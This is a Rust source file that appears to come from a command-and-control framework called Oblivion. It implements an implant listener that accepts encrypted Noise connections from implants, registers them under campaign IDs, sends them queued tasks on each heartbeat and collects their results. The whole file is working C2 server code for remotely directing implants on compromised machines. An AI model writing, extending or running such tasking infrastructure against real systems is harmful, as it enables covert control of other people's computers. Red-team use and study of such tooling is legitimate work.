use crate::config::ServerConfig;
use crate::crypto::keys::ServerIdentity;
use crate::protocol::NoiseTransport;
use crate::server::session_manager::SessionManager;
use crate::tasks::TaskEngine;
use std::sync::Arc;
use tokio::net::{TcpListener, TcpStream};
use tracing;

pub struct ImplantListener {
    listener: TcpListener,
    identity: Arc<ServerIdentity>,
    session_manager: Arc<SessionManager>,
    task_engine: Arc<TaskEngine>,
    config: ServerConfig,
}

impl ImplantListener {
    pub async fn new(
        config: ServerConfig,
        identity: Arc<ServerIdentity>,
        session_manager: Arc<SessionManager>,
        task_engine: Arc<TaskEngine>,
    ) -> crate::Result<Self> {
        let listener = TcpListener::bind(config.implant_listener).await?;
        
        tracing::info!("Implant listener bound to {}", config.implant_listener);
        
        Ok(Self {
            listener,
            identity,
            session_manager,
            task_engine,
            config,
        })
    }
    
    pub async fn run(self) -> crate::Result<()> {
        loop {
            let (stream, addr) = self.listener.accept().await?;
            tracing::debug!("New connection from {}", addr);
            
            let identity = self.identity.clone();
            let sessions = self.session_manager.clone();
            let tasks = self.task_engine.clone();
            
            tokio::spawn(async move {
                if let Err(e) = handle_implant(stream, identity, sessions, tasks).await {
                    tracing::warn!("Implant handler error: {}", e);
                }
            });
        }
    }
}

async fn handle_implant(
    stream: TcpStream,
    identity: Arc<ServerIdentity>,
    sessions: Arc<SessionManager>,
    tasks: Arc<TaskEngine>,
) -> crate::Result<()> {
    // Perform Noise handshake
    let (mut transport, initial_payload) = NoiseTransport::accept(stream, identity.public_key()).await?;
    
    // Parse initial registration
    let inner_msg = crate::protocol::messages::proto::InnerImplantMessage::decode(
        &*initial_payload
    ).map_err(|_| crate::OblivionError::InvalidMessage)?;
    
    // Extract registration request
    let register_req = match inner_msg.payload {
        Some(crate::protocol::messages::proto::inner_implant_message::Payload::Register(req)) => req,
        _ => return Err(crate::OblivionError::Protocol("Expected registration".into())),
    };
    
    // For now, use a default campaign or extract from metadata
    let campaign_id = register_req.metadata.get("campaign_id")
        .cloned()
        .unwrap_or_else(|| "default".to_string());
    
    // Register session
    let session_id = sessions.register_session(campaign_id, register_req, &mut transport).await?;
    
    // Main message loop
    loop {
        let msg_bytes = transport.read_message().await?;
        let inner_msg = crate::protocol::messages::proto::InnerImplantMessage::decode(&*msg_bytes)
            .map_err(|_| crate::OblivionError::InvalidMessage)?;
        
        match inner_msg.payload {
            Some(crate::protocol::messages::proto::inner_implant_message::Payload::Heartbeat(hb)) => {
                sessions.handle_heartbeat(&session_id).await?;
                
                // Check for pending tasks
                let pending = tasks.get_pending_tasks(&session_id).await?;
                
                for task in pending {
                    let server_msg = crate::protocol::messages::proto::InnerServerMessage {
                        payload: Some(crate::protocol::messages::proto::inner_server_message::Payload::Task(task)),
                    };
                    
                    let encoded = prost::Message::encode_to_vec(&server_msg);
                    transport.write_message(&encoded).await?;
                }
            }
            
            Some(crate::protocol::messages::proto::inner_implant_message::Payload::Result(result)) => {
                tasks.process_result(result.task_id, result).await?;
            }
            
            Some(crate::protocol::messages::proto::inner_implant_message::Payload::ErrorReport(err)) => {
                tracing::error!("Implant error [{}]: {}", err.error_code, err.message);
            }
            
            _ => {
                tracing::warn!("Unknown message type from session {}", session_id);
            }
        }
    }
}